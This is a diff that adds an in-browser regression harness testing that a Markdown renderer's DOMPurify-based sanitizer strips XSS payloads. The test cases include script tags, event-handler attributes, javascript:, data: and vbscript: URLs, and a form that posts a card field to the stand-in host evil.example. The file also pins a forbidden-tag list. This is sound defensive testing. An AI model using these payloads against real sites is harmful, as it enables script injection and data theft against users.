@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <!--
+      markdown-xss.html — LiteCode-CPP Phase 5 ★ Markdown XSS 净化 regression harness.
+
+      PURPOSE
+      --------
+      This is an IN-BROWSER regression test. It loads the production
+      `csp.js` + `markdown.js` modules (the exact same bundles served
+      to /problem.html) and feeds them a battery of adversarial
+      Markdown payloads. The output asserts that no payload can:
+
+        1. Inject a working <script> tag
+        2. Execute via an event handler (onclick / onerror / onload)
+        3. Bypass the URL allowlist with javascript: / data:text/html
+        4. Hide a script inside a banned parent tag (<style>, <iframe>)
+        5. Slip past via a CSS expression / expression() / url(javascript:)
+
+      HOW TO RUN
+      ----------
+        • Open in any modern browser:
+            file://…/web/test/markdown-xss.html
+          or against a live dev server:
+            http://localhost:8080/test/markdown-xss.html
+
+        • From CI (puppeteer/playwright), assert that the
+          `#result-summary` element ends with the string "ALL PASS".
+
+        • From a shell, with curl + a JS engine (e.g. deno / node):
+          (Not supported today — the harness needs a real DOM. We
+          intentionally avoid JSDOM mocks because the whole point of
+          the test is to exercise the real DOMPurify bundle as the
+          browser will run it.)
+
+      WHAT IT IS NOT
+      ---------------
+      • Not a unit test for the C++ server. The server's contract
+        is "deliver raw Markdown, sanitization is the browser's
+        job" — see tests/unit/test_problem_detail.cpp for that.
+
+      • Not a replacement for a real XSS scanner (Burp / ZAP). The
+        payloads here are the ones the spec calls out + a handful
+        of common bypass attempts; they pin the configuration.
+
+      The harness self-tests by re-parsing the sanitized HTML and
+      checking the result is free of any of the patterns below.
+    -->
+    <meta charset="UTF-8">
+    <title>LiteCode · Markdown XSS 净化 regression</title>
+    <link rel="stylesheet" href="/css/style.css">
+
+    <style>
+        body { font-family: var(--lc-font-mono, monospace); padding: 16px; }
+        .lc-test-summary  { padding: 16px; border: 2px solid currentColor; margin: 16px 0; }
+        .lc-test-pass     { color: var(--lc-color-success, #0a7c2f); }
+        .lc-test-fail     { color: var(--lc-color-danger,  #c0392b); }
+        .lc-test-row      { padding: 8px; border-top: 1px solid var(--lc-color-border, #ddd); }
+        .lc-test-row pre  { background: var(--lc-color-bg-alt, #f6f6f6); padding: 8px; overflow-x: auto; }
+        .lc-test-row .lc-test-failed-output { background: #fff5f5; }
+    </style>
+</head>
+<body>
+    <h1>Markdown XSS 净化 regression</h1>
+    <p>
+        Adversarial Markdown payloads run through <code>litecode.markdown</code>.
+        A green <code>ALL PASS</code> at the bottom means the sanitizer rejected
+        every payload it was supposed to reject.
+    </p>
+
+    <div id="result-summary" class="lc-test-summary" hidden></div>
+    <div id="result-rows"></div>
+
+    <script src="/js/csp.js"></script>
+    <script src="/js/markdown.js"></script>
+    <script>
+    (function () {
+        'use strict';
+
+        // The lib is loaded by the time this inline script runs
+        // because both files are loaded synchronously above (no
+        // defer) and they execute in order.
+        if (!window.litecode || !window.litecode.markdown) {
+            document.body.insertAdjacentHTML('beforeend',
+                '<p class="lc-test-fail">FATAL: csp.js + markdown.js did not register ' +
+                'window.litecode.markdown</p>');
+            return;
+        }
+
+        // Each test case is { name, markdown, mustNotContain[] }.
+        // mustNotContain is a list of substrings that MUST NOT appear
+        // in the sanitized output. We pick a couple of positive
+        // assertions (mustContain) on the Markdown round-tripping
+        // cases to make sure we didn't accidentally throw the baby
+        // out with the bathwater.
+        var CASES = [
+            {
+                name: 'plain-text round-trip',
+                markdown: 'Hello, **world**!',
+                mustNotContain: [],
+                mustContain: ['Hello,', '<strong>world</strong>'],
+            },
+            {
+                name: 'inline <script> tag',
+                markdown: 'Hello <script>alert(1)</script> world',
+                mustNotContain: ['<script', 'alert(1)', 'alert&#40;1&#41;'],
+            },
+            {
+                name: 'image onerror',
+                markdown: '![](https://x/x.png "onerror=alert(1)")\n\n![alt](x.png "onerror=alert(1)")',
+                // marked passes the title attribute through unchanged.
+                // DOMPurify must drop `onerror` (it's not in the attr
+                // allowlist). The image src 'x.png' is not http(s) so
+                // it would also be dropped by the URL filter — but the
+                // payload is about event handlers, not URL filter.
+                mustNotContain: ['onerror', 'onerror=alert', 'onload'],
+            },
+            {
+                name: 'inline event handler on <a>',
+                markdown: '[click me](https://example.com "onclick=alert(1)")',
+                mustNotContain: ['onclick', 'onerror'],
+            },
+            {
+                name: 'inline event handler raw HTML',
+                markdown: '<a href="https://example.com" onclick="alert(1)">click</a>',
+                mustNotContain: ['onclick', 'alert(1)'],
+            },
+            {
+                name: 'javascript: URL in <a>',
+                markdown: '[click me](javascript:alert(1))',
+                mustNotContain: ['javascript:', 'alert(1)'],
+            },
+            {
+                name: 'data:text/html URL in <a>',
+                markdown: '[click me](data:text/html,<script>alert(1)</script>)',
+                mustNotContain: ['<script', 'data:text/html'],
+            },
+            {
+                name: 'vbscript: URL in <a>',
+                markdown: '[click me](vbscript:msgbox(1))',
+                mustNotContain: ['vbscript:', 'msgbox(1)'],
+            },
+            {
+                name: '<iframe> tag',
+                markdown: '<iframe src="https://evil.example/"></iframe>',
+                mustNotContain: ['<iframe', 'evil.example'],
+            },
+            {
+                name: '<style> tag',
+                markdown: '<style>body{background:url("javascript:alert(1)")}</style>',
+                mustNotContain: ['<style', 'javascript:'],
+            },
+            {
+                name: '<object> + <embed>',
+                markdown: '<object data="https://x/x.swf"></object><embed src="x">',
+                mustNotContain: ['<object', '<embed', 'x.swf'],
+            },
+            {
+                name: 'form auto-submit',
+                markdown: '<form action="https://evil.example/steal"><input name=cc><button>go</button></form>',
+                mustNotContain: ['<form', '<input', '<button', 'evil.example'],
+            },
+            {
+                name: '<base href> hijack',
+                markdown: '<base href="https://evil.example/">',
+                mustNotContain: ['<base', 'evil.example'],
+            },
+            {
+                name: 'data: image src on <img>',
+                markdown: '<img src="data:text/html,<script>alert(1)</script>">',
+                // The src is `data:text/html,...` — blocked by the URL
+                // filter (only http(s) + image data URIs survive).
+                mustNotContain: ['data:text/html', 'alert(1)'],
+            },
+            {
+                name: 'CSS expression',
+                markdown: '<div style="background:expression(alert(1))">x</div>',
+                // `style` is not in the attribute allowlist → dropped.
+                mustNotContain: ['style=', 'expression(', 'alert(1)'],
+            },
+            {
+                name: 'mixed-case <ScRiPt> tag',
+                markdown: '<ScRiPt>alert(1)</ScRiPt>',
+                mustNotContain: ['<script', 'ScRiPt>', 'alert(1)'],
+            },
+            {
+                name: 'mixed-case javascript: URL',
+                markdown: '[click](JaVaScRiPt:alert(1))',
+                mustNotContain: ['javascript:', 'alert(1)'],
+            },
+            {
+                name: 'entity-encoded <script>',
+                markdown: '&lt;script&gt;alert(1)&lt;/script&gt;',
+                // The text itself is "decoded" by marked so the output
+                // contains the literal text, not a <script> tag.
+                // We just want to be sure no <script> appears.
+                mustNotContain: ['<script'],
+                mustContain: ['&lt;script&gt;'],   // the entities survive
+            },
+            {
+                name: 'GFM code block (allowed)',
+                markdown: '```cpp\nint main(){return 0;}\n```',
+                mustContain: ['<pre>', '<code', 'int main'],
+            },
+            {
+                name: 'GFM table (allowed)',
+                markdown: '| a | b |\n|---|---|\n| 1 | 2 |',
+                mustContain: ['<table>', '<th>a</th>', '<td>1</td>'],
+            },
+            {
+                name: 'comment injection',
+                markdown: '<!--[if IE]><script>alert(1)</script><![endif]-->',
+                // IE conditional comments aren't valid HTML5; the
+                // browser ignores them, but we want to make sure
+                // DOMPurify didn't keep the inner <script> in a
+                // weird state. Most importantly, no <script> tag
+                // must survive.
+                mustNotContain: ['<script', 'alert(1)'],
+            },
+        ];
+
+        // Run the test suite.
+        var total = CASES.length;
+        var passed = 0;
+        var failed = 0;
+        var rows = document.getElementById('result-rows');
+
+        function row(label, body, failedOutput) {
+            var div = document.createElement('div');
+            div.className = 'lc-test-row';
+            var h = document.createElement('h3');
+            h.textContent = label;
+            div.appendChild(h);
+            var pre = document.createElement('pre');
+            pre.textContent = body || '(empty)';
+            div.appendChild(pre);
+            if (failedOutput) {
+                var f = document.createElement('pre');
+                f.className = 'lc-test-row lc-test-failed-output';
+                f.textContent = 'OFFENDING OUTPUT:\n' + failedOutput;
+                div.appendChild(f);
+            }
+            rows.appendChild(div);
+        }
+
+        function assert(cond, msg) {
+            if (!cond) throw new Error(msg);
+        }
+
+        CASES.forEach(function (c) {
+            try {
+                var out = window.litecode.markdown.renderSafeSync(c.markdown);
+                (c.mustNotContain || []).forEach(function (needle) {
+                    if (out.indexOf(needle) !== -1) {
+                        throw new Error('output must not contain "' + needle + '"');
+                    }
+                });
+                (c.mustContain || []).forEach(function (needle) {
+                    if (out.indexOf(needle) === -1) {
+                        throw new Error('output must contain "' + needle + '"');
+                    }
+                });
+                row('✓ ' + c.name, c.markdown + '\n\n  →\n\n' + out, null);
+                passed++;
+            } catch (e) {
+                var out2 = '';
+                try { out2 = window.litecode.markdown.renderSafeSync(c.markdown); } catch (_) {}
+                row('✗ ' + c.name + ' — ' + e.message, c.markdown, out2);
+                failed++;
+            }
+        });
+
+        // Also pin the configuration that drives the sanitizer. If
+        // a future commit accidentally drops a tag from the
+        // allowlist (e.g. a "helpful refactor" that lists all
+        // standard tags), this check trips.
+        var cfg = window.litecode.markdown._config;
+        assert(cfg && cfg.ALLOWED_TAGS && cfg.ALLOWED_TAGS.indexOf('a') !== -1, 'allowlist missing <a>');
+        assert(cfg.ALLOWED_TAGS.indexOf('p') !== -1,         'allowlist missing <p>');
+        assert(cfg.ALLOWED_TAGS.indexOf('table') !== -1,     'allowlist missing <table>');
+        assert(cfg.FORBID_TAGS.indexOf('script') !== -1,     'FORBID_TAGS missing <script>');
+        assert(cfg.FORBID_TAGS.indexOf('iframe') !== -1,     'FORBID_TAGS missing <iframe>');
+        assert(cfg.FORBID_TAGS.indexOf('style') !== -1,      'FORBID_TAGS missing <style>');
+        assert(cfg.FORBID_TAGS.indexOf('form') !== -1,       'FORBID_TAGS missing <form>');
+        assert(cfg.FORBID_TAGS.indexOf('object') !== -1,     'FORBID_TAGS missing <object>');
+        assert(cfg.FORBID_TAGS.indexOf('embed') !== -1,      'FORBID_TAGS missing <embed>');
+        assert(cfg.FORBID_TAGS.indexOf('meta') !== -1,       'FORBID_TAGS missing <meta>');
+        assert(cfg.FORBID_TAGS.indexOf('base') !== -1,       'FORBID_TAGS missing <base>');
+        assert(cfg.ALLOWED_ATTR.indexOf('onclick') === -1,   'allowlist MUST NOT permit onclick');
+        assert(cfg.ALLOWED_ATTR.indexOf('onerror') === -1,   'allowlist MUST NOT permit onerror');
+        assert(cfg.ALLOWED_ATTR.indexOf('style')  === -1,    'allowlist MUST NOT permit style');
+        assert(cfg.MARKED_OPTIONS.mangle    === false,       'marked mangle must be off');
+        assert(cfg.MARKED_OPTIONS.headerIds === false,       'marked headerIds must be off');
+        assert(cfg.SCRIPTS.marked.integrity.indexOf('sha384-') === 0,    'marked SRI missing');
+        assert(cfg.SCRIPTS.dompurify.integrity.indexOf('sha384-') === 0, 'DOMPurify SRI missing');
+
+        // Render the summary line.
+        var summary = document.getElementById('result-summary');
+        summary.hidden = false;
+        if (failed === 0) {
+            summary.className = 'lc-test-summary lc-test-pass';
+            summary.textContent = 'ALL PASS — ' + passed + ' / ' + total + ' sanitizer cases accepted';
+        } else {
+            summary.className = 'lc-test-summary lc-test-fail';
+            summary.textContent = 'FAIL — ' + failed + ' of ' + total + ' cases leaked payload';
+        }
+    })();
+    </script>
+</body>
+</html>
